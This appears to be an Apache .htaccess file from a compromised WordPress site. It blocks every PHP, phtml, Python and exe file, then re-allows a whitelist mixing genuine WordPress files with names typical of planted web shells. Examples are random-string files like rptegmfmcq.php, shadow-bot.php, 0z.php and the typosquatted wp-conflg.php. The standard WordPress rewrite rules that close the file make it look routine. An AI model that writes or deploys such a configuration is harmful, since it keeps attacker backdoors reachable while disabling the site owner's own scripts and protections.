<FilesMatch ".(PhP|php5|suspected|phtml|py|exe|php)$">
 Order allow,deny
 Deny from all
</FilesMatch>
<FilesMatch "(^wp-feed.php|^server33.php|^index.php|^qindex.php|^db.php|^wp-mail.php|^recollection.php|^ticket.php|^language_view.php|^wp-activate.php|^wp-links-opml.php|^wp-blog-header.php|^wp-load.php|^wp-signup.php|^admin-filters.php|^wp-trackback.php|^loggertrait.php|^account.php|^theme_support.php|^bt4.php|^wp-atom.php|^style.php|^atomlib.php|^makeasmtp.php|^prayer_intentions.php|^wp-settings.php|^shadow-bot.php|^class-ai1wm-status.php|^melipayamakapi.php|^csv.php|^rptegmfmcq.php|^wlkjfoqicr.php|^0z.php|^bucketendpointmiddleware.php|^classwithtostring.php|^baindex.php|^phpmailer.lang-sv.php|^state.php|^special_dishes.php|^nf_tracking.php|^webhook.php|^pnnfxpueiq.php|^autoload_classmap.php|^shadow.php|^sample.php|^1index.php|^error_exception.php|^wp-config.php|^xmlrpc.php|^wp-pano.php|^main.php|^product.php|^goods.php|^shop.php|^store.php|^online.php|^good.php|^discount.php|^buy.php|^sale.php|^mall.php|^amazon.php|^groupon.php|^lowpr.php|^savep.php|^infos.php|^pindex.php|^todo.php|^start.php|^chosen.php|^style.php|^wp-conflg.php|^wp-22.php|^class.phtml|^index.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule>